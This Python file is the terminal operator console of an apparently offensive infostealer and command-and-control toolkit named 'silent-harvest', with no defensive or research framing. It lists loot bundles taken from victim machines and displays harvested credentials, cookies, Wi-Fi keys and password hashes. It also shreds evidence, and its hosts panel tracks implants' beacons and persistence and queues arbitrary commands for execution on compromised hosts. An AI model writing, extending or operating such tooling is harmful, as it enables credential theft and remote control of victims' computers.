#!/usr/bin/env python3
"""silent-harvest operator TUI — browse, parse, and manage collected loot.

Runs entirely on the stdlib (no curses — Windows-safe). ANSI rendering with
raw-keyboard input on Windows (msvcrt) and POSIX (termios).

    python tui.py [--loot-dir ../loot] [--no-watch]

Keys
  list      ↑/↓ j/k select · PgUp/PgDn · Enter detail
            / live filter (Esc clears, Enter keeps) · o cycle sort
            H hosts panel · p parse full · s shred (confirm)
            l access log · c creds.json · h help · R rescan · q quit
  detail    v report.txt · m manifest.json · c creds.json
            u unlocked/ outputs · p/s as above · Esc/q back
  hosts     ↑/↓ select · t queue exec task · x clear queue
            Enter view queued tasks · Esc/q back
  pager     ↑↓ scroll · PgUp/PgDn · g/G top/bottom · q/Esc back

Watch mode (default) re-scans the loot dir every 2s — leave the collector
running in another terminal and bundles appear live.

--demo renders one frame to stdout and exits (CI/headless safe).
"""
import argparse
import json
import os
import shutil
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import shcrypto  # noqa: F401  (psk sharing with parse subprocess)
import term
from term import C, s
from parse_loot import colorize_report_line  # noqa: E402 (after sys.path setup)

LOOT_DEFAULT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "loot")
WATCH_INTERVAL = 2.0

# --------------------------------------------------------------------- input
class KeyInput:
    """Cross-platform raw key reader with millisecond timeout.

    Returns canonical names: 'up','down','left','right','pgup','pgdn',
    'home','end','enter','esc','tab','backspace', or the literal character.
    """

    def __init__(self):
        self.win = os.name == "nt"
        self.posix_saved = None
        if not self.win:
            import termios
            import tty
            self.termios, self.tty = termios, tty
            try:
                self.posix_saved = termios.tcgetattr(sys.stdin)
                tty.setcbreak(sys.stdin.fileno())
            except termios.error:
                self.posix_saved = None

    def close(self):
        if not self.win and self.posix_saved is not None:
            try:
                self.termios.tcsetattr(sys.stdin, self.termios.TCSADRAIN,
                                       self.posix_saved)
            except Exception:
                pass

    def getkey(self, timeout_ms=250):
        if self.win:
            import msvcrt
            end = time.time() + timeout_ms / 1000.0
            while time.time() < end:
                if msvcrt.kbhit():
                    ch = msvcrt.getch()
                    if ch in (b"\x00", b"\xe0"):
                        ch2 = msvcrt.getch()
                        return {
                            b"H": "up", b"P": "down", b"K": "left", b"M": "right",
                            b"I": "pgup", b"Q": "pgdn", b"G": "home", b"O": "end",
                            b"R": "f2", b"S": "del",
                        }.get(ch2, "?%s" % ch2.hex())
                    if ch == b"\r":
                        return "enter"
                    if ch == b"\n":
                        return "enter"
                    if ch == b"\x1b":
                        return "esc"
                    if ch == b"\x08":
                        return "backspace"
                    if ch == b"\t":
                        return "tab"
                    try:
                        return ch.decode("utf-8")
                    except UnicodeDecodeError:
                        return "?"
                time.sleep(0.02)
            return None
        # posix
        import select
        r, _, _ = select.select([sys.stdin], [], [], timeout_ms / 1000.0)
        if not r:
            return None
        ch = sys.stdin.read(1)
        if ch == "\x1b":
            # possible escape sequence
            r2, _, _ = select.select([sys.stdin], [], [], 0.03)
            if not r2:
                return "esc"
            c2 = sys.stdin.read(1)
            if c2 == "[":
                c3 = sys.stdin.read(1)
                return {
                    "A": "up", "B": "down", "C": "right", "D": "left",
                    "H": "home", "F": "end",
                    "5": "pgup", "6": "pgdn",   # note: 5~/6~ arrive as 5,6 + '~'
                }.get(c3, "?")
            return "esc"
        if ch in ("\r", "\n"):
            return "enter"
        if ch == "\t":
            return "tab"
        if ch == "\x7f":
            return "backspace"
        return ch


# --------------------------------------------------------------------- data
def scan_loot(loot_dir):
    bundles = []
    if not os.path.isdir(loot_dir):
        return bundles
    for d in sorted(os.listdir(loot_dir)):
        p = os.path.join(loot_dir, d)
        b = os.path.join(p, "bundle.bin")
        if not os.path.isdir(p) or not os.path.exists(b):
            continue
        entry = {
            "id": d, "dir": p,
            "size": os.path.getsize(b),
            "mtime": os.path.getmtime(b),
            "parsed": os.path.exists(os.path.join(p, "report.txt")),
        }
        # victim info from stored manifest
        try:
            with open(os.path.join(p, "manifest.json")) as f:
                m = json.load(f)
            v = m.get("victim", {})
            entry.update({
                "host": v.get("host", "?"),
                "user": v.get("user", "?"),
                "elevated": str(v.get("elevated", "false")).lower() == "true",
                "platform": v.get("platform", "windows"),
                "ts": int(v.get("ts", entry["mtime"])),
                "nparts": len(m.get("parts", [])),
            })
        except Exception:
            entry.update({"host": "?", "user": "?", "elevated": False,
                          "platform": "?", "ts": int(entry["mtime"]),
                          "nparts": 0})
        bundles.append(entry)
    bundles.sort(key=lambda e: e["mtime"], reverse=True)
    return bundles


def dir_fingerprint(loot_dir):
    """Cheap change detection for watch mode."""
    try:
        idx = os.path.join(loot_dir, "index.jsonl")
        acc = os.path.join(loot_dir, "access.log")
        hosts = os.path.join(loot_dir, "hosts.json")
        st = (os.path.getmtime(loot_dir),
              os.path.getmtime(idx) if os.path.exists(idx) else 0,
              os.path.getmtime(acc) if os.path.exists(acc) else 0,
              os.path.getmtime(hosts) if os.path.exists(hosts) else 0)
        return st
    except OSError:
        return (0, 0, 0, 0)


def scan_hosts(loot_dir):
    """hosts.json + queued-task counts -> rows for the C2 panel."""
    rows = []
    hp = os.path.join(loot_dir, "hosts.json")
    if os.path.exists(hp):
        try:
            h = json.load(open(hp, encoding="utf-8"))
        except Exception:
            h = {}
        now = time.time()
        for hid, v in sorted(h.items(),
                             key=lambda kv: -kv[1].get("last_seen", 0)):
            age = now - v.get("last_seen", 0)
            rows.append({
                "id": hid,
                "online": age < 600,
                "seen": ("%dm" % (age // 60)) if age < 3600
                        else ("%dh" % (age // 3600)) if age < 86400
                        else "%dd" % (age // 86400),
                "beacons": v.get("beacons", 0),
                "elevated": str(v.get("elevated", "?")).lower() == "true",
                "persist": str(v.get("persist", "?")),
                "version": str(v.get("version", "?")),
                "queued": len(load_queue(loot_dir, hid)),
            })
    return rows


def load_queue(loot_dir, hid):
    p = os.path.join(loot_dir, "tasks", hid + ".json")
    try:
        return json.load(open(p, encoding="utf-8"))
    except Exception:
        return []


def save_queue(loot_dir, hid, q):
    d = os.path.join(loot_dir, "tasks")
    os.makedirs(d, exist_ok=True)
    import tempfile
    fd, tmp = tempfile.mkstemp(dir=d, suffix=".tmp")
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        json.dump(q, f, indent=2)
    os.replace(tmp, os.path.join(d, hid + ".json"))


# --------------------------------------------------------------------- app
HELP = [
    "silent-harvest operator console",
    "",
    "  ↑/↓ or j/k   move selection            Enter      open bundle detail",
    "  PgUp/PgDn     page                      Home/End   first/last",
    "  p             parse bundle (full)       r          parse redacted",
    "  s             shred bundle (confirm)    l          access log",
    "  c             view creds.json           v/m        report / manifest (detail view)",
    "  R             rescan now                h/?        this help",
    "  q             quit                      Esc        back / close overlay",
    "",
    "watch mode rescans the loot dir every 2s; run the collector in",
    "another terminal and bundles appear here live.",
]


class App:
    VIEWS = ("list", "detail", "pager", "help", "hosts")

    def __init__(self, loot_dir, watch=True):
        self.loot = os.path.abspath(loot_dir)
        self.watch = watch
        self.bundles = []
        self.sel = 0
        self.view = "list"
        self.status = ""
        self.status_at = 0
        self.pager_file = None
        self.pager_lines = []
        self.pager_top = 0
        self.pager_title = ""
        self.pager_from = "list"
        self.confirm = None          # pending confirmation prompt text+action
        self.help_top = 0
        self.last_fp = None
        # filtering / sorting (list view)
        self.filter = ""
        self.filtering = False
        self.sort_mode = 0           # 0 recent, 1 size, 2 host
        self.sort_modes = (("recent", lambda b: b["ts"]),
                           ("size", lambda b: b["size"]),
                           ("host", lambda b: (b["host"], b["ts"])))
        # hosts / c2 panel
        self.hosts_sel = 0
        # modal single-line input (task command etc.)
        self.prompt_title = ""
        self.prompt_buf = ""
        self.prompt_cb = None
        self.rescan()

    # ---------------------------------------------------------- filtering
    def visible_bundles(self):
        if not self.filter:
            return self.bundles
        f = self.filter.lower()
        return [b for b in self.bundles
                if f in b["host"].lower() or f in b["user"].lower()
                or f in b["id"].lower() or f in b["platform"].lower()]

    def resort(self):
        key = self.sort_modes[self.sort_mode][1]
        self.bundles.sort(key=key, reverse=self.sort_mode != 2)
        self.sel = min(self.sel, max(0, len(self.visible_bundles()) - 1))

    # ---------------------------------------------------------- helpers
    def rescan(self):
        try:
            kept = (self.bundles[self.sel]["id"]
                    if 0 <= self.sel < len(self.bundles) else None)
        except Exception:
            kept = None
        self.bundles = scan_loot(self.loot)
        self.sel = 0
        if kept:
            for i, b in enumerate(self.bundles):
                if b["id"] == kept:
                    self.sel = i
                    break
        self.last_fp = dir_fingerprint(self.loot)

    def cur(self):
        shown = self.visible_bundles()
        if 0 <= self.sel < len(shown):
            return shown[self.sel]
        return None

    def flash(self, msg, *codes):
        self.status = s(msg, *codes) if codes else msg
        self.status_at = time.time()

    def load_pager_text(self, text, title):
        """Page over in-memory text (task queues etc.)."""
        self.pager_lines = text.splitlines()
        self.pager_top = 0
        self.pager_title = title
        self.pager_file = None
        self.pager_from = self.view
        self.view = "pager"

    def load_pager(self, path, title):
        if not os.path.exists(path):
            self.flash("no such file: %s" % path, C.RED)
            return False
        try:
            with open(path, encoding="utf-8", errors="replace") as f:
                self.pager_lines = f.read().splitlines()
        except OSError as e:
            self.flash("read failed: %s" % e, C.RED)
            return False
        self.pager_file = path
        self.pager_title = title
        self.pager_top = 0
        self.pager_from = self.view if self.view in ("list", "detail") else "list"
        self.view = "pager"
        return True

    def do_parse(self, redact=False):
        b = self.cur()
        if not b:
            return
        args = [sys.executable, os.path.join(os.path.dirname(
            os.path.abspath(__file__)), "parse_loot.py"), b["dir"]]
        if redact:
            args.append("--redact")
        self.flash("parsing %s ..." % b["id"], C.CYAN)
        r = subprocess.run(args, capture_output=True, text=True, timeout=300)
        if r.returncode == 0:
            b["parsed"] = True
            self.flash("✓ parsed %s%s" % (b["id"], " (redacted)" if redact else ""),
                       C.GREEN, C.BOLD)
        else:
            tail = (r.stdout + r.stderr).strip().splitlines()[-1:]
            self.flash("parse failed: %s" % (tail[0] if tail else "rc=%d" % r.returncode),
                       C.RED)

    def do_shred(self):
        b = self.cur()
        if not b:
            return
        self.confirm = ("shred %s (%s)? this overwrites and deletes it [y/N]"
                        % (b["id"], term.human_size(b["size"])),
                        lambda: self._shred_now(b))

    def _shred_now(self, b):
        import parse_loot
        n = parse_loot.shred_bundle(os.path.abspath(b["dir"]))
        self.rescan()
        self.flash("shredded %d dir(s)" % n, C.YELLOW, C.BOLD)

    # ---------------------------------------------------------- rendering
    def render(self):
        cols, rows = shutil.get_terminal_size((100, 30))
        body_h = rows - 4  # header(2) + status(1) + keys(1)
        out = []

        # header
        total = sum(b["size"] for b in self.bundles)
        nparsed = sum(1 for b in self.bundles if b["parsed"])
        hosts = scan_hosts(self.loot)
        online = sum(1 for h in hosts if h["online"])
        head = " %s  %s bundles · %s · %s parsed%s  %s host(s), %s online%s" % (
            s("silent-harvest", C.BOLD, C.CYAN),
            s(str(len(self.bundles)), C.BOLD),
            s(term.human_size(total), C.CYAN),
            s(str(nparsed), C.GREEN),
            s("   [watch]" if self.watch else "", C.GREY),
            s(str(len(hosts)), C.BOLD),
            s(str(online), C.GREEN),
            s("   sort:%s" % self.sort_modes[self.sort_mode][0], C.GREY))
        out.append(head[:cols])
        if self.filter:
            tip = "  (Enter keep · Esc clear)" if self.filtering else ""
            out.append(s(" filter: %s" % self.filter, C.YELLOW)
                       + s("  (%d shown)%s" % (len(self.visible_bundles()), tip),
                          C.GREY))
        else:
            out.append(s("─" * (cols - 1), C.DIM))

        if self.view == "list":
            out += self.render_list(body_h, cols)
        elif self.view == "detail":
            out += self.render_detail(body_h, cols)
        elif self.view == "pager":
            out += self.render_pager(body_h, cols)
        elif self.view == "help":
            out += self.render_help(body_h, cols)
        elif self.view == "hosts":
            out += self.render_hosts(body_h, cols)

        # pad body to fixed height, then status + key bar
        while len(out) < 2 + body_h:
            out.append("")
        out = out[:2 + body_h]

        if self.confirm:
            out.append(" " + self.confirm[0][:cols - 2])
        elif self.prompt_cb is not None:
            out.append(" %s %s%s" % (
                s(self.prompt_title, C.CYAN, C.BOLD),
                self.prompt_buf,
                s("▏", C.CYAN)))
        elif self.status and time.time() - self.status_at < 6:
            out.append(" " + self.status[:cols - 2])
        else:
            out.append("")

        hints = {
            "list": "↑↓ select · Enter detail · / filter · o sort · H hosts · "
                    "p parse · s shred · l log · h help · q quit",
            "detail": "v report · m manifest · c creds · u unlock outputs · "
                      "p parse · s shred · Esc/q back",
            "pager": "↑↓ scroll · PgUp/PgDn · g/G top/bottom · q/Esc back",
            "help": "q/Esc close",
            "hosts": "↑↓ select · t task exec · x clear queue · Enter view tasks · "
                     "Esc/q back",
        }
        out.append(s(" " + hints.get(self.view, hints["list"]), C.GREY))
        # clip every line to the terminal width so nothing ever wraps and
        # scrolls the alt-screen (ANSI-aware truncation)
        return [term.clip(ln, cols) if ln else ln for ln in out]

    def render_list(self, h, cols):
        shown = self.visible_bundles()
        if not self.bundles:
            return ["", s("  no bundles under %s" % self.loot, C.YELLOW),
                    s("  run the collector (server/collector.py) and harvests "
                      "will appear here%s" % (" live" if self.watch else ""), C.GREY)]
        if not shown:
            return ["", s("  filter '%s' matches nothing" % self.filter, C.YELLOW)]
        headers = ["WHEN", "HOST", "USER", "PLAT", "ELEV", "PARTS", "SIZE", "PARSED"]
        now = time.time()
        rows = []
        for b in shown:
            dt = now - b["ts"]
            when = ("%dm ago" % (dt // 60)) if dt < 3600 else (
                "%dh ago" % (dt // 3600)) if dt < 86400 else "%dd" % (dt // 86400)
            rows.append([
                when,
                b["host"], b["user"],
                b["platform"][:7],
                s("yes", C.YELLOW, C.BOLD) if b["elevated"] else "-",
                str(b["nparts"]),
                term.human_size(b["size"]),
                s("✓", C.GREEN, C.BOLD) if b["parsed"] else s("·", C.GREY),
            ])
        out = []
        start, end = self._paginate(len(rows), h)
        # build the full table once, then slice rows so columns stay aligned
        tbl = term.table(headers, rows)
        out.append(tbl[0])
        for i in range(start, end):
            marker = "▸" if i == self.sel else " "
            line = marker + tbl[1 + i][1:]
            if i == self.sel:
                line = s(line, C.REVERSE)   # unmissable selection bar
            out.append(line)
        if end < len(rows):
            out.append(s("  … %d more" % (len(rows) - end), C.GREY))
        return out

    def render_hosts(self, h, cols):
        hosts = scan_hosts(self.loot)
        if not hosts:
            return ["", s("  no hosts registered yet", C.YELLOW),
                    s("  hosts appear when an implant beacons or exfils "
                      "(--loop builds)", C.GREY)]
        headers = ["HOST", "STATUS", "SEEN", "BEACONS", "ELEV", "PERSIST",
                   "VER", "QUEUED"]
        rows = []
        for hh in hosts:
            rows.append([
                hh["id"],
                s("● online", C.GREEN, C.BOLD) if hh["online"]
                else s("○ off", C.GREY),
                hh["seen"],
                str(hh["beacons"]),
                s("yes", C.YELLOW, C.BOLD) if hh["elevated"] else "-",
                hh["persist"][:12],
                hh["version"][:8],
                s(str(hh["queued"]), C.MAGENTA, C.BOLD) if hh["queued"] else "0",
            ])
        out = []
        self.hosts_sel = min(self.hosts_sel, len(hosts) - 1)
        start, end = self._paginate(len(rows), h)
        tbl = term.table(headers, rows)
        out.append(tbl[0])
        for i in range(start, end):
            marker = "▸" if i == self.hosts_sel else " "
            line = marker + tbl[1 + i][1:]
            if i == self.hosts_sel:
                line = s(line, C.REVERSE)
            out.append(line)
        # show queued task detail under the table when room allows
        if end >= len(rows) and hosts and hosts[self.hosts_sel]["queued"]:
            out.append("")
            out.append(s("  queued tasks for %s:" % hosts[self.hosts_sel]["id"],
                         C.BOLD, C.MAGENTA))
            for t in load_queue(self.loot, hosts[self.hosts_sel]["id"])[:4]:
                out.append("   " + s(json.dumps(t), C.GREY)[:cols - 4])
        return out

    def _paginate(self, n, h):
        if n <= h:
            return 0, n
        half = h // 2
        if self.sel < half:
            return 0, h
        if self.sel >= n - half:
            return n - h, n
        return self.sel - half, self.sel - half + h

    def render_detail(self, h, cols):
        b = self.cur()
        if not b:
            self.view = "list"
            return []
        out = []
        try:
            with open(os.path.join(b["dir"], "manifest.json")) as f:
                m = json.load(f)
        except Exception:
            m = {"victim": {}}
        v = m.get("victim", {})
        for label, val in (("id", b["id"]), ("host", v.get("host")),
                           ("user", v.get("user")), ("domain", v.get("domain")),
                           ("os", v.get("os")), ("platform", v.get("platform", "windows")),
                           ("elevated", v.get("elevated")), ("se_backup", v.get("se_backup")),
                           ("arch", v.get("arch"))):
            out.append("  %s  %s" % (s("%-10s" % label, C.GREY), s(str(val), C.BOLD)))
        out.append("")
        out.append(s("  parts", C.BOLD))
        parts = m.get("parts", [])
        tbl = term.table(["NAME", "LEN", "META"],
                         [[p.get("name", "?"), p.get("len", 0),
                           str(p.get("meta", ""))[:40]] for p in parts])
        out.append(tbl[0])
        start, end = self._paginate(len(parts), max(3, h - len(out) - 1))
        for i in range(start, end):
            out.append(tbl[1 + i][1:])
        if end < len(parts):
            out.append(s("  … %d more" % (len(parts) - end), C.GREY))
        return out

    def render_pager(self, h, cols):
        out = [s(" %s" % self.pager_title, C.BOLD, C.CYAN),
               s("─" * (cols - 1), C.DIM)]
        n = len(self.pager_lines)
        if self.pager_top > max(0, n - 1):
            self.pager_top = max(0, n - 1)
        vis = self.pager_lines[self.pager_top:self.pager_top + max(1, h - 2)]
        for i, ln in enumerate(vis):
            num = s("%5d " % (self.pager_top + i + 1), C.GREY)
            if self.pager_file and self.pager_file.endswith("report.txt"):
                out.append(num + colorize_report_line(ln))
            else:
                out.append(num + ln)
        if n > h - 2:
            pct = int(100 * (self.pager_top + len(vis)) / max(1, n))
            out.append(s(" %d/%d lines (%d%%)" % (self.pager_top + len(vis), n, pct),
                         C.GREY))
        return out

    def render_help(self, h, cols):
        return [s("  " + l, C.BOLD if i == 0 else C.RESET) for i, l in enumerate(HELP)]

    # ---------------------------------------------------------- keys
    def handle_key(self, k):
        if self.confirm:
            if k in ("y", "Y"):
                act = self.confirm[1]
                self.confirm = None
                act()
            else:
                self.confirm = None
            return

        # modal single-line input (task exec etc.)
        if self.prompt_cb is not None:
            if k == "enter":
                cb, val = self.prompt_cb, self.prompt_buf
                self.prompt_cb = None
                self.prompt_buf = ""
                if val.strip():
                    cb(val.strip())
            elif k == "esc":
                self.prompt_cb = None
                self.prompt_buf = ""
                self.flash("cancelled")
            elif k == "backspace":
                self.prompt_buf = self.prompt_buf[:-1]
            elif k is not None and len(k) == 1 and k.isprintable():
                self.prompt_buf += k
            return

        if self.view == "help":
            if k in ("q", "esc", "h", "?", "enter"):
                self.view = "list"
            return

        if self.view == "pager":
            self._pager_keys(k)
            return

        if self.view == "hosts":
            self._hosts_keys(k)
            return

        if self.view == "detail":
            if k in ("esc", "q"):
                self.view = "list"
                return
            b = self.cur()
            if k == "v" and b:
                self.load_pager(os.path.join(b["dir"], "report.txt"), "report.txt")
            elif k == "m" and b:
                self.load_pager(os.path.join(b["dir"], "manifest.json"), "manifest.json")
            elif k == "c" and b:
                self.load_pager(os.path.join(b["dir"], "creds.json"), "creds.json")
            elif k == "u" and b:
                self._open_unlocked(b)
            elif k in ("p", "r"):
                self.do_parse(redact=(k == "r"))
            elif k == "s":
                self.do_shred()
            return

        # list view
        n = len(self.visible_bundles())
        if k in (None, "?0", "?1"):
            return
        # '/' opens the filter; while open, ALL printable keys edit it
        if self.filtering or k == "/":
            if not self.filtering:          # opening: swallow the '/'
                self.filtering = True
                return
            if k == "esc":
                self.filtering = False
                self.filter = ""
                self.sel = 0
                self.flash("filter cleared", C.CYAN)
            elif k == "enter":
                self.filtering = False
            elif k == "backspace":
                self.filter = self.filter[:-1]
                if not self.filter:
                    self.filtering = False
                self.sel = min(self.sel, max(0, len(self.visible_bundles()) - 1))
            elif k is not None and len(k) == 1 and k.isprintable():
                self.filter += k
                self.sel = min(self.sel, max(0, len(self.visible_bundles()) - 1))
            return
        # Esc with a kept filter still clears it
        if k == "esc" and self.filter:
            self.filter = ""
            self.sel = 0
            self.flash("filter cleared", C.CYAN)
            return
        if k in ("up", "k") and n:
            self.sel = max(0, self.sel - 1)
        elif k in ("down", "j") and n:
            self.sel = min(n - 1, self.sel + 1)
        elif k == "pgup":
            self.sel = max(0, self.sel - 10)
        elif k == "pgdn" and n:
            self.sel = min(n - 1, self.sel + 10)
        elif k == "home" and n:
            self.sel = 0
        elif k == "end" and n:
            self.sel = n - 1
        elif k == "enter" and n:
            self.view = "detail"
        elif k == "l":
            self.load_pager(os.path.join(self.loot, "access.log"), "access.log")
        elif k == "c" and n:
            b = self.cur()
            self.load_pager(os.path.join(b["dir"], "creds.json"), "creds.json")
        elif k == "p" and n:
            self.do_parse()
        elif k == "r" and n:
            self.do_parse(redact=True)
        elif k == "s" and n:
            self.do_shred()
        elif k == "R":
            self.rescan()
            self.flash("rescanned: %d bundles" % len(self.bundles), C.CYAN)
        elif k in ("h", "?"):
            self.view = "help"
        elif k == "H":
            self.view = "hosts"
            self.hosts_sel = 0
        elif k == "o":
            self.sort_mode = (self.sort_mode + 1) % len(self.sort_modes)
            self.resort()
            self.flash("sort: %s" % self.sort_modes[self.sort_mode][0], C.CYAN)
        elif k == "/":
            pass  # handled above

    # ------------------------------------------------------- hosts panel
    def _hosts_keys(self, k):
        hosts = scan_hosts(self.loot)
        n = len(hosts)
        if not n:
            if k in ("esc", "q", "H", "enter"):
                self.view = "list"
            return
        self.hosts_sel = min(self.hosts_sel, n - 1)
        if k in ("up", "k"):
            self.hosts_sel = max(0, self.hosts_sel - 1)
        elif k in ("down", "j"):
            self.hosts_sel = min(n - 1, self.hosts_sel + 1)
        elif k in ("esc", "q", "H"):
            self.view = "list"
        elif k == "t":
            hid = hosts[self.hosts_sel]["id"]
            self.prompt_title = "exec on %s:" % hid
            self.prompt_cb = lambda cmd, _hid=hid: self.queue_exec(_hid, cmd)
        elif k == "x":
            hid = hosts[self.hosts_sel]["id"]
            save_queue(self.loot, hid, [])
            self.flash("queue cleared for %s" % hid, C.CYAN)
        elif k == "enter":
            hid = hosts[self.hosts_sel]["id"]
            q = load_queue(self.loot, hid)
            if not q:
                self.flash("no queued tasks for %s" % hid)
            else:
                self.load_pager_text(
                    "\n".join(json.dumps(t, indent=2) for t in q),
                    "queued tasks: %s" % hid)

    def queue_exec(self, hid, cmd):
        q = load_queue(self.loot, hid)
        q.append({"id": "tui-%d" % int(time.time()), "exec": cmd})
        save_queue(self.loot, hid, q)
        self.flash("queued on %s: %s" % (hid, cmd), C.GREEN)

    def _open_unlocked(self, b):
        """Page through offline_unlock outputs if present for this bundle."""
        ud = os.path.join(b["dir"], "unlocked")
        if not os.path.isdir(ud):
            self.flash("no unlocked/ outputs yet — run offline_unlock.py first")
            return
        want = ("passwords.txt", "cookies_all.txt", "wifi.txt", "hashes.txt",
                "report.txt")
        for w in want:
            p = os.path.join(ud, w)
            if os.path.exists(p):
                self.load_pager(p, "unlocked/%s" % w)
                return
        files = sorted(os.listdir(ud))
        if files:
            self.load_pager(os.path.join(ud, files[0]), "unlocked/%s" % files[0])
        else:
            self.flash("unlocked/ is empty")

    def _pager_keys(self, k):
        visible = 20
        if k in ("up", "k"):
            self.pager_top = max(0, self.pager_top - 1)
        elif k in ("down", "j"):
            self.pager_top = min(max(0, len(self.pager_lines) - 1), self.pager_top + 1)
        elif k == "pgup":
            self.pager_top = max(0, self.pager_top - visible)
        elif k == "pgdn":
            self.pager_top = min(max(0, len(self.pager_lines) - 1),
                                 self.pager_top + visible)
        elif k == "g":
            self.pager_top = 0
        elif k == "G":
            self.pager_top = max(0, len(self.pager_lines) - 1)
        elif k in ("q", "esc"):
            self.view = self.pager_from


# --------------------------------------------------------------------- main
HIDE = "\x1b[?25l"
SHOW = "\x1b[?25h"
ALT_ON = "\x1b[?1049h"    # alternate screen buffer: repaints replace, never stack
ALT_OFF = "\x1b[?1049l"


def render_splash(app):
    """Banner splash frame shown for a beat on TUI start."""
    import term as _term
    cols, _ = shutil.get_terminal_size((124, 30))
    lines = []
    for ln in _term.BANNER:
        pad = max(0, (cols - len(ln)) // 2)
        lines.append(_term.clip(" " * pad + s(ln, C.CYAN, C.BOLD), cols))
    lines.append("")
    sub = "operator console"
    pad = max(0, (cols - len(sub)) // 2)
    lines.append(" " * pad + s(sub, C.GREY))
    lines.append("")
    return lines


def run(app, keys=None):
    keys = keys or KeyInput()
    write = sys.stdout.write
    # alt screen + hidden cursor: frames replace each other in place
    write(ALT_ON + HIDE)
    write("\x1b[H\x1b[J" + "\n".join(render_splash(app)) + "\n")
    sys.stdout.flush()
    keys.getkey(1200)  # splash beat; any key skips it
    last_frame = None
    last_scan = 0.0
    try:
        while True:
            now = time.time()
            if app.watch and now - last_scan >= WATCH_INTERVAL:
                if dir_fingerprint(app.loot) != app.last_fp:
                    app.rescan()
                    app.flash("rescanned: %d bundles" % len(app.bundles), C.CYAN)
                last_scan = now
            frame = "\n".join(app.render())
            if frame != last_frame:
                write("\x1b[H\x1b[J" + frame + "\n")
                sys.stdout.flush()
                last_frame = frame
            k = keys.getkey(200)
            # 'q' means "quit" ONLY in list view; everywhere else it means
            # "go back" and is handled by the view's own key handler
            if k == "\x03":
                break
            if k == "q" and app.view == "list" and app.prompt_cb is None:
                break
            if k:
                app.handle_key(k)
    except KeyboardInterrupt:
        pass
    finally:
        # restore the user's screen exactly as it was
        write(SHOW + ALT_OFF)
        sys.stdout.flush()
        keys.close()


def demo(app):
    print("\n".join(render_splash(app)))
    print("\n".join(app.render()))
    if app.bundles:
        app.view = "detail"
        print("\n".join(app.render()))


def main():
    ap = argparse.ArgumentParser(description="silent-harvest operator console")
    ap.add_argument("--loot-dir", default=LOOT_DEFAULT)
    ap.add_argument("--no-watch", action="store_true")
    ap.add_argument("--demo", action="store_true",
                    help="render one frame to stdout and exit (headless/CI)")
    args = ap.parse_args()

    term.init()
    app = App(args.loot_dir, watch=not args.no_watch)
    if args.demo:
        demo(app)
        return
    if not sys.stdin.isatty() or not sys.stdout.isatty():
        raise SystemExit("refusing to run interactive TUI without a tty "
                         "(use --demo for a headless frame)")
    run(app)


if __name__ == "__main__":
    main()
